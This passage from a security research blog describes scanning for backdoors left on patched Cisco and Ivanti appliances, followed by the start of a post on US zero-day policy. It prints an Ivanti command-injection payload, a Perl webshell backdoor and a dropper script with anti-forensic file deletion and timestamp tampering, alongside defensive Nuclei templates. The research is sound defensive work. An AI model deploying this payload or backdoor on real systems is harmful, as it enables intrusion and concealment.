<p>Additionally, after the generic attempt started to lose effectiveness, we would scan for the 18-character string and version number (indicated by <code class="language-plaintext highlighter-rouge">content = "/2010202301/"</code> in Listing 5) that would be returned upon setting the <code class="language-plaintext highlighter-rouge">logon_hash</code> parameter, as shown in Listing 8. The cat- and mouse game that resulted from actors changing the implant, forcing us to change our scanning methodology, interestingly shows a textbook attacker-defender dynamic. Again, patching the vulnerability didn’t mean the system was clean, as the number of compromised appliances skyrocketed shortly after the vulnerability was published.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">cisco-ios-implant-detection-CVE-2023-20273-v2</span>

<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">Cisco IOS-XE Mass Exploitation CVE-2023-20273 v2</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">http</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">/webui/logoutconfirm.html?logon_hash=1"</span>

    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">regex</span>
        <span class="na">regex</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">.{18}"</span>
        <span class="na">part</span><span class="pi">:</span> <span class="s">body</span>

  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">/webui/logoutconfirm.html?menu=1"</span>

    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">word</span>
        <span class="na">words</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">1010202301"</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 8: Nuclei scanning template to detect BadCandy implants after generic approach no longer worked accurately</span></p>

<h3 id="results-a-mapped-out-global-infection-flare-up">Results: a mapped-out global infection flare-up</h3>
<p>Roughly three weeks after the vulnerability was published, on October 18, 2023, we measured a total of 72.795 backdoored devices. The United States leads the list by a considerable margin, likely due to its large enterprise router footprint and widespread exposure of the Web UI. Southeast Asia and Latin America also show significant concentrations. Compared to the distribution of the Citrix ADC investigation, the countries affected the most seem to be completely different.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">sorted_data</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span><span class="nf">sorted</span><span class="p">(</span><span class="n">countries</span><span class="p">.</span><span class="nf">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">item</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">items</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">sorted_data</span><span class="p">.</span><span class="nf">items</span><span class="p">())</span>
<span class="p">...</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">5</span><span class="p">):</span>
<span class="p">...</span>     <span class="n">line</span> <span class="o">=</span> <span class="n">items</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span>
<span class="p">...</span>     <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">  </span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="sh">"</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">line</span><span class="p">))</span>
<span class="bp">...</span>
<span class="n">US</span><span class="p">:</span> <span class="mi">5218</span>  <span class="n">PH</span><span class="p">:</span> <span class="mi">3857</span>  <span class="n">CL</span><span class="p">:</span> <span class="mi">2901</span>  <span class="n">MX</span><span class="p">:</span> <span class="mi">2568</span>  <span class="n">IN</span><span class="p">:</span> <span class="mi">2154</span>
<span class="n">TH</span><span class="p">:</span> <span class="mi">1862</span>  <span class="n">PE</span><span class="p">:</span> <span class="mi">1829</span>  <span class="n">BE</span><span class="p">:</span> <span class="mi">1321</span>  <span class="n">AT</span><span class="p">:</span> <span class="mi">1105</span>  <span class="n">BR</span><span class="p">:</span> <span class="mi">1073</span>
<span class="n">CH</span><span class="p">:</span> <span class="mi">1043</span>  <span class="n">SG</span><span class="p">:</span> <span class="mi">986</span>  <span class="n">GB</span><span class="p">:</span> <span class="mi">966</span>  <span class="n">IT</span><span class="p">:</span> <span class="mi">964</span>  <span class="n">AU</span><span class="p">:</span> <span class="mi">875</span>
<span class="n">DE</span><span class="p">:</span> <span class="mi">860</span>  <span class="n">NL</span><span class="p">:</span> <span class="mi">750</span>  <span class="n">EC</span><span class="p">:</span> <span class="mi">714</span>  <span class="n">FR</span><span class="p">:</span> <span class="mi">696</span>  <span class="n">RU</span><span class="p">:</span> <span class="mi">620</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 9: Top 20 countries with BadCandy implants on October 18th, 2023</span></p>

<p>All system owners that were compromised received a notification about the implant, steps to remediate, and advice on how to proceed. While Cisco themselves attempted to bury these numbers, collective effort from the industry brought down the infection rate and number of compromised hosts significantly over the months after.</p>

<h2 id="ivanti-connect-secure---cve-2024-21893">Ivanti Connect Secure - CVE-2024-21893</h2>
<p>A few months later, on January 31st, 2024, Ivanti released fixes to address four vulnerabilities. One of these, CVE-2024-21893, which is a Server-Side Request Forgery (SSRF) vulnerability that affected the SAML module. Researchers from Rapid7 and AssetNote released a working POC that anyone could use and within hours of its release, attacks were identified targeting this SAML vulnerability. The first to publish a report on the implants resulting from these attacks was <a href="https://www.orangecyberdefense.com/global/blog/research/ivanti-connect-secure-discover-the-dslog-backdoor">Orange Cyberdefense</a>, who dubbed it the DSLog backdoor.</p>

<p>As with the previous cases, post-exploitation scanning revealed compromises that would have gone unnoticed by standard vulnerability checks.</p>

<h3 id="scanning-for-the-backdoors-2">Scanning for the Backdoors</h3>
<p>An important aspect of scanning for the DSLog backdoor is the first stage of the exploit, shown in Listing 9. The payload outputs either a set of random characters or the output of <code class="language-plaintext highlighter-rouge">uname -a</code> to a publicly accessible file (index.txt, index1.txt, index2.txt, etc.). This seemed to be reconnaissance activity (shown in Listing 10) to confirm that the exploit worked on the target device, an idea that is corroborated by Orange Cyberdefense. Interestingly, in 1cases where the attackers cleared the log files, the <code class="language-plaintext highlighter-rouge">uname -a</code> output offered a timestamp on the time of compromise, which is temporal evidence for the breach.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Base64 encoded request</span>
https://127.0.0.1:8090/api/v1/license/keys-status/<span class="p">;</span><span class="nb">echo </span>ZWNobyAkKHVuYW1lIC1hO2lkKT4vaG9tZS93ZWJzZXJ2ZXIvaHRkb2NzL2RhbmEtbmEvaW1ncy9pbmRleDIudHh0|/usr/bin/base64 <span class="nt">-d</span> | /bin/bash<span class="p">;</span>

<span class="c"># Decoded command</span>
https://127.0.0.1:8090/api/v1/license/keys-status/<span class="p">;</span><span class="nb">echo</span> <span class="si">$(</span><span class="nb">uname</span> <span class="nt">-a</span><span class="p">;</span><span class="nb">id</span><span class="si">)</span><span class="o">&gt;</span>/home/webserver/htdocs/dana-na/imgs/index2.txt|/usr/bin/base64 <span class="nt">-d</span> | /bin/bash<span class="p">;</span>

<span class="c"># Output in index2.txt</span>
Linux localhost2 2.6.32-00032-g2005e8d-dirty <span class="c">#1 SMP Thu Jun 22 03:40:39 EDT 2023 x86_64 x86_64 x86_64 GNU/Linux uid=0(root) gid=0(root) groups=0(root)</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 10: SSRF payload for CVE-2024-21893</span></p>

<p>With the knowledge of now, the methodology and characteristics of the backdoor <a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-exploiting-critical-ivanti-vulnerability">closely resemble</a> the suspected China-nexus espionage actor tracked as UNC5221 (Mandiant) or UTA0178 (Volexity). At the time, IBM <a href="https://www.ibm.com/think/x-force/exploitation-of-exposed-ivanti-vulnerabilities">wrote a blogpost</a> that mentioned the involvement of UNC5221 based on other reporting, but also admitted they could not corroborate these findings with sufficient confidence. The type, way of dropping, and chosen locations of the webshell seem to be similar to the later Ivanti Connect Secure webshells attributed to UNC5221, such as the webshells related to <a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement">SPAWNANT</a> installer and <a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day">PHASEJAM</a> dropper.</p>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">sub </span><span class="nf">Msg</span> <span class="p">{</span>
  <span class="k">my</span> <span class="p">(</span><span class="nv">$event</span><span class="p">,</span> <span class="nv">$level</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="o">=</span> <span class="nv">@_</span><span class="p">;</span>
  <span class="k">my</span> <span class="p">(</span><span class="nv">$pkg</span><span class="p">,</span> <span class="nv">$file</span><span class="p">,</span> <span class="nv">$line</span><span class="p">)</span> <span class="o">=</span> <span class="nb">caller</span><span class="p">;</span>
  <span class="k">my</span> <span class="nv">$ua</span> <span class="o">=</span> <span class="nv">$ENV</span><span class="p">{</span><span class="nv">HTTP_USER_AGENT</span><span class="p">};</span>
  <span class="k">my</span> <span class="nv">$req</span> <span class="o">=</span> <span class="nv">$ENV</span><span class="p">{</span><span class="nv">QUERY_STRING</span><span class="p">};</span>
  <span class="k">my</span> <span class="nv">$qur</span> <span class="o">=</span> <span class="p">"</span><span class="s2">&lt;redacted&gt;</span><span class="p">";</span>
  <span class="k">my</span> <span class="nv">@param</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/&amp;/</span><span class="p">,</span> <span class="nv">$req</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">index</span><span class="p">(</span><span class="nv">$ua</span><span class="p">,</span> <span class="nv">$qur</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="mi">1</span><span class="p">]){</span>
      <span class="k">my</span> <span class="nv">@res</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/=/</span><span class="p">,</span> <span class="nv">$param</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">eq</span> <span class="p">"</span><span class="s2">cdi</span><span class="p">"){</span>  <span class="c1"># Include command in cdi parameter</span>
        <span class="nv">$res</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=~</span> <span class="sr">s/([a-fA-F0-9][a-fA-F0-9])/chr(hex($1))/</span><span class="nv">eg</span><span class="p">;</span>
        <span class="nv">$res</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=~</span> <span class="sr">tr/!-~/P-~!-O/</span><span class="p">;</span>
        <span class="nb">system</span><span class="p">(</span><span class="nv">$</span><span class="p">{</span><span class="nv">res</span><span class="p">[</span><span class="mi">1</span><span class="p">]});</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nv">$file</span> <span class="o">=</span> <span class="nb">substr</span> <span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nb">rindex</span> <span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="p">"</span><span class="s2">/</span><span class="p">")</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
  <span class="c1"># Prevent C printf format codes to make it through...</span>
  <span class="nv">$data</span> <span class="o">=~</span> <span class="sr">s/%/%%/g</span><span class="p">;</span>
  <span class="nv">Msg_impl</span> <span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$line</span><span class="p">,</span> <span class="nv">$event</span><span class="p">,</span> <span class="nv">$level</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div>
<p><span class="centered-text">Listing 11: Modified function in the /home/perl/DSLog.pm file</span></p>

<p>Listing 11 shows the altered <code class="language-plaintext highlighter-rouge">Msg()</code> function on line 102 in the <code class="language-plaintext highlighter-rouge">/home/perl/DSLog.pm</code> file that includes the implant. DSLog.pm is normally a legitimate script that is used to log events on the Ivanti appliance. Commands can be executed through the shell by adding the (URL-encoded) command to the request with the <code class="language-plaintext highlighter-rouge">cdi</code> parameter. The added code is injected using the exploit shown in Listing 10, but this time with the base64-encoded payload shown in Listing 12. The payload checks if the device has already been infected, after which it writes the implant to the DSLog file and performs some anti-forensics.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set paths to target files</span>
<span class="nv">DESTFILE</span><span class="o">=</span><span class="s2">"/home/perl/DSLog.pm"</span>
<span class="nv">CLFILE</span><span class="o">=</span><span class="s2">"/home/perl/DSLogMB.pm"</span>

<span class="c"># Check if the file already contains HTTP_USER_AGENT</span>
<span class="k">if </span><span class="nb">cat</span> <span class="s2">"</span><span class="nv">$DESTFILE</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s1">'HTTP_USER_AGENT'</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s1">'OK'</span>
<span class="k">else</span>
    <span class="c"># Inject Perl code starting at line 102</span>
    <span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'102i\
my $ua = $ENV{HTTP_USER_AGENT};\
my $req = $ENV{QUERY_STRING};\
my $qur = "&lt;redacted&gt;";\
my @param = split(/&amp;/, $req);\
if (index($ua, $qur) != -1) {\
    if ($param[1]) {\
        my @res = split(/=|,/, $param[1]);\
        if ($res[0] eq "cdi") {\
            $res[1] =~ s/([a-fA-F0-9][a-fA-F0-9])/chr(hex($1))/eg;\
            $res[1] =~ tr/!-/P-~/P-~.!-O/;\
            system($res[1]);\
        }\
    }\
}'</span> <span class="s2">"</span><span class="nv">$DESTFILE</span><span class="s2">"</span>
<span class="k">fi</span>

<span class="c"># Sync timestamp of DESTFILE to match CLFILE (anti-forensics)</span>
<span class="nb">touch</span> <span class="nt">-r</span> <span class="s2">"</span><span class="nv">$CLFILE</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$DESTFILE</span><span class="s2">"</span>

<span class="c"># Clear crash dump traces</span>
<span class="nb">rm</span> <span class="nt">-rf</span> /var/cores/<span class="k">*</span>

<span class="c"># Run a Python warm restart with shellcode injection via base64 decoding</span>
/home/venv3/bin/python3 <span class="nt">-c</span> <span class="s1">'import DSMonitor; DSMonitor.warmRestart()'</span> | /usr/bin/base64 <span class="nt">-d</span> | /bin/bash
</code></pre></div></div>
<p><span class="centered-text">Listing 12: Exploit payload to drop the implant</span></p>

<p>Because the implant contains a unique key (SHA256 hash) that needs to be included in the User Agent to execute commands, there was no way to directly interact with it. However, the initial stage of the compromise included the creation of a publicly available file that contained predictable output. Therefore, this offered a scanning methodology to at least gain an indication that the implant had been present on the system.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">CVE-2024-21893</span>

<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">DSLog backdoor Ivanti Connect Secure</span>
  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">variables</span><span class="pi">:</span>
  <span class="na">index</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">index.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index1.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index2.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index3.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index4.txt"</span><span class="pi">]</span>

<span class="na">requests</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">GET</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">/dana-na/imgs/"</span>

    <span class="na">matchers-condition</span><span class="pi">:</span> <span class="s">and</span>
    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">word</span>
        <span class="na">words</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">WatchGuard"</span>
        <span class="na">part</span><span class="pi">:</span> <span class="s">body</span>
        <span class="na">negative</span><span class="pi">:</span> <span class="kc">true</span>

      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">dsl</span>
        <span class="na">dsl</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">len(body)</span><span class="nv"> </span><span class="s">&gt;</span><span class="nv"> </span><span class="s">0</span><span class="nv"> </span><span class="s">&amp;&amp;</span><span class="nv"> </span><span class="s">status_code</span><span class="nv"> </span><span class="s">==</span><span class="nv"> </span><span class="s">200"</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 13: Nuclei scanning template for the DSLog implant</span></p>

<p>These files offered sufficient coverage to locate the DSLog backdoor in a scanning campaign. We did not have to approach the implant itself, which is always important from the ethics perspective. Instead of probing the implant directly, we scanned for signs of dropped index files using the method in Listing 13. Normally, the Ivanti Connect Secure appliances will return an HTTP 404 upon making a request to an endpoint that does not exist. Therefore, by scanning for HTTP 200 responses on the known indicators and verifying the content of the response, public systems could be scanned for this webshell. The only thing to take into account is to filter out the occasional WatchGuard WAF response.</p>

<h3 id="results">Results</h3>
<p>Two weeks after the vulnerability became public, on February 12th, 2024, we conducted a scan for the DSLog backdoor and found 50 backdoored instances in 17 countries. With such little results, it becomes interesting to look at the types of organizations that were backdoored. In this instance, most organizations that were compromised seemed to belong to either the steel, healthcare (robotics), telecommunications, or banking sector.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">sorted_data</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span><span class="nf">sorted</span><span class="p">(</span><span class="n">countries</span><span class="p">.</span><span class="nf">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">item</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">items</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">sorted_data</span><span class="p">.</span><span class="nf">items</span><span class="p">())</span>
<span class="p">...</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">5</span><span class="p">):</span>
<span class="p">...</span>     <span class="n">line</span> <span class="o">=</span> <span class="n">items</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span>
<span class="p">...</span>     <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">  </span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="sh">"</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">line</span><span class="p">))</span>
<span class="bp">...</span>
<span class="n">US</span><span class="p">:</span> <span class="mi">18</span>  <span class="n">JP</span><span class="p">:</span> <span class="mi">6</span>  <span class="n">KR</span><span class="p">:</span> <span class="mi">4</span>  <span class="n">HK</span><span class="p">:</span> <span class="mi">3</span>  <span class="n">SG</span><span class="p">:</span> <span class="mi">2</span>
<span class="n">CN</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">IN</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">DE</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">ZA</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">BH</span><span class="p">:</span> <span class="mi">2</span>
<span class="n">FR</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">ES</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">MY</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">CA</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">TR</span><span class="p">:</span> <span class="mi">1</span>
<span class="n">NL</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">IT</span><span class="p">:</span> <span class="mi">1</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 14: Countries with DSLog implants on February 12th, 2024.</span></p>

<p>After conducting a notification campaign and sharing the information through the appropriate channels, the implants were largely taken down. On April 4th, 2024, there were eight remaining implants. These implants are active to this day.</p>

<h1 id="conclusion-when-fixing-isnt-enough">Conclusion: when fixing isn’t enough</h1>
<p>Patching is a vital part of vulnerability management, but as the case studies in this blog post show, it is no longer sufficient on its own. Persistent backdoors can survive patch windows, quietly operating long after the initial exploit has been closed. If defenders stop looking once the CVE is fixed, they risk missing the real threat: compromise that has already taken root.</p>

<p>Ethical, public-interest scanning helps fill this gap. By focusing on behavioral residues and side channels, we can responsibly detect implants without triggering them and incorporate this into our scanning routines. As vulnerability researchers and incident responders, our responsibility should extend beyond identifying vulnerabilities alone. Finding these implants using responsible methods is part of a broader mission to protect the public interest and support those who may not even realize they are at risk.</p>

<p>This is a reminder that vulnerability response must move beyond the binary of “patched or not” and instead ask the harder question: was the adversary already inside? Until vendors and defenders treat post-patch compromise as a first-class threat model, this work will remain essential—and at times, the only line of defense. Patching closes the door, but unless we check the locks, the intruder may still be inside.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Observations on Threat Intelligence" /><summary type="html"><![CDATA[Even after patching, many edge devices remain compromised. This post explores how to ethically scan for backdoors left behind.]]></summary></entry><entry><title type="html">Ready, Retain, Fire? The Quiet Fallout of U.S. Offensive Cyber Policy</title><link href="http://localhost:4000/2025/05/30/us-cyber-policy-zero-day-retention.html" rel="alternate" type="text/html" title="Ready, Retain, Fire? The Quiet Fallout of U.S. Offensive Cyber Policy" /><published>2025-05-30T00:00:00+02:00</published><updated>2025-05-30T00:00:00+02:00</updated><id>http://localhost:4000/2025/05/30/us-cyber-policy-zero-day-retention</id><content type="html" xml:base="http://localhost:4000/2025/05/30/us-cyber-policy-zero-day-retention.html"><![CDATA[<p>Being a CNA administrator means having access to something most people never see: zero-day vulnerabilities. That access comes with responsibility, but also perspective. It’s made me think about how other actors, especially governments, handle this kind of knowledge, and what it means when one side holds a stockpile of vulnerabilities capable of large-scale surveillance or disruption. The U.S. military even <a href="https://cyber.army.mil/News/Article/1325442/stockpiling-zero-day-exploits-the-next-international-weapons-taboo/">considered</a> classifying zero-days as weapons subject to export controls.</p>

<p>I was encouraged to see that some governments have public procedures designed to manage this power transparently. But lately, it feels like that transparency is under pressure.</p>

<p>When the United Kingdom launched the HMS <em>Dreadnought</em> in 1906, it redefined naval warfare. The dreadnought was a warship so advanced, that it wasn’t just a display of power: it was a strategic signal that reshaped expectations. Germany responded by expanding its fleet, triggering a naval arms race rooted less in intent and more in perceived necessity.</p>

<h1 id="the-zero-day-dreadnought">The zero-day dreadnought</h1>

<figure class="figure-float-right">
  <img style="padding:10px; max-width:79%;" src="../../../assets/VEP_Process.png" alt="VEP Process" />
  <figcaption>Figure 1: The VEP Flowchart,<br /> taken from trumpwhitehouse.archives.gov</figcaption>
</figure>

<p>Today, a similar pattern seems to be emerging in the digital realm. As the Trump administration returned in 2025, its cybersecurity strategy is shifting from structured deterrence to a more aggressive, <a href="https://therecord.media/trump-administration-change-the-script-on-offensive-hacking">offense-first approach</a>, aligning with Trump’s <em>Peace Through Strength</em> doctrine. This posture builds on the foundation laid by <a href="https://www.iiss.org/cyber-power-matrix/anticipating-trumps-influence-on-us-cyber-command/">National Security Presidential Memoranda 13 (NSPM-13)</a> in 2018, which loosened interagency controls over offensive cyber operations.</p>

<p>One important, but seemingly overlooked, mechanism to the U.S. offensive cyberpower is the <a href="https://trumpwhitehouse.archives.gov/sites/whitehouse.gov/files/images/External%20-%20Unclassified%20VEP%20Charter%20FINAL.PDF">Vulnerabilities Equities Process (VEP)</a>, which is the Government Disclosure Decision Process (GDDP) used to decide whether to disclose or retain newly discovered zero-day vulnerabilities. While the VEP itself has not formally changed under Trump’s current or previous administrations, it involves significant discretion, particularly in assessing whether disclosure would harm national security. Within a policy environment that is increasingly shaped by offense, there is a growing risk that this discretion may increasingly tilt toward retention.</p>

<p>Though no explicit mandate has been issued, the combination of centralizing authority, reducing transparency, and <a href="https://www.whitehouse.gov/wp-content/uploads/2025/05/Fiscal-Year-2026-Discretionary-Budget-Request.pdf">dismantling oversight mechanisms</a> sends a clear signal to other states: retention is not an exception, it may be becoming the norm. Like the dreadnought, this strategic posture may reset international expectations–not through declaration, but by example.</p>

<h1 id="from-deterrence-to-retention">From deterrence to retention?</h1>
<p>One of the effects of the NSPM-13 was that it streamlined the approval process for offensive cyber operations. This facilitated the <em>Defend Forward</em> doctrine, enabling U.S. Cyber Command to preemptively disrupt threats without explicit presidential approval. While proponents argue this <a href="https://www.cybercom.mil/Media/News/Article/3198878/cyber-101-defend-forward-and-persistent-engagement/">enhances deterrence</a>, research from the Atlantic Council suggests an <a href="https://www.atlanticcouncil.org/programs/cyber-statecraft-initiative/the-proliferation-of-offensive-cyber-capabilities/">overreliance on offensive cyber operations</a> can increase global instability, as adversaries mirror these tactics and <a href="https://www.cato.org/policy-analysis/myth-cyber-offense-case-restraint?#cyber-command-s-new-more-aggressive-policy">see this as provocation</a> instead of deterrence.</p>

<p>The Biden administration adjusted this trajectory by introducing additional checks and transparency mechanisms. However, the first half of 2025 suggests that the second Trump administration may reverse this course. The weakening of oversight mechanisms, such as <a href="https://www.documentcloud.org/documents/25500093-dhs-advisory-boards-termination-letter/">the Cyber Safety Review Board (CSRB)</a>, and the consolidation of decision-making authority within the executive branch indicate a growing emphasis on offensive capability.</p>

<p>This evolution doesn’t come with an explicit declaration that the U.S. is retaining more vulnerabilities. However, the surrounding policy signals–reduced transparency, diminished oversight, and intensified offensive posture–suggest a trend that warrants scrutiny.</p>

<h1 id="strategic-signaling-and-the-dreadnought-effect">Strategic signaling and the dreadnought effect</h1>
<p>Just like the dreadnought reset the bar for naval power, a more opaque and offense-first U.S. cyber doctrine may risk shifting global norms. Vulnerability retention, which was once carefully weighed through the VEP, may increasingly be seen as the default by other nations watching U.S. behavior. This matters because it sends signals, not only to adversaries, but also to allies. Only a few other countries have a GDDP: the <a href="https://www.gchq.gov.uk/information/equities-process">United Kingdom</a> and <a href="https://www.aivd.nl/onderwerpen/onbekende-kwetsbaarheden#:~:text=Kwetsbaarheid%20melden%2C%20tenzij…&amp;text=Hiervoor%20geldt%20het%20beleid%3A%20'melden,(voorlopig)%20niet%20te%20melden.">the Netherlands</a> have a defined GDDP, and Germany has explored a GDDP since 2018, but has not implemented a formal process to date. Because GDDPs are self-imposed constraints, most countries seem to have not prioritized their development or public debate. If the U.S. treats vulnerabilities as strategic assets rather than shared risks, other governments may feel compelled to follow its lead. Even those working to strengthen Coordinated Vulnerability Disclosure (CVD), such as the European Union through the Cyber Resilience Act and the NIS2 Directive, could face internal pressure to reassess their approach. In the end, a GDDP is a way for states to impose accountability on themselves. Without such a process, states may retain greater flexibility, but at the cost of reduced transparency.</p>

<blockquote>
  <p>The <strong>dreadnought effect</strong> refers to the unintended consequences of a dominant power’s strategic innovation resetting international norms. Named after HMS Dreadnought, a revolutionary British battleship launched in 1906, the term describes how a single state’s advancement can pressure others to escalate—even if they had no initial desire to do so. In cybersecurity, the metaphor applies to how shifts in U.S. offensive posture may lead other nations to change their own vulnerability disclosure strategies, simply to maintain parity.</p>
</blockquote>

<h1 id="the-narrow-corridor-and-the-red-queen-effect">The narrow corridor and the red queen effect</h1>
<p><a href="https://www.penguinrandomhouse.com/books/555400/the-narrow-corridor-by-daron-acemoglu-and-james-a-robinson/">Acemoglu and Robinson’s <em>Narrow Corridor</em></a> frames healthy governance as a balance between state power and societal oversight. In this model, both must evolve jointly, providing equal pressure to one another. If one accelerates while the other stagnates, the system risks slipping into authoritarian overreach or institutional weakness.</p>

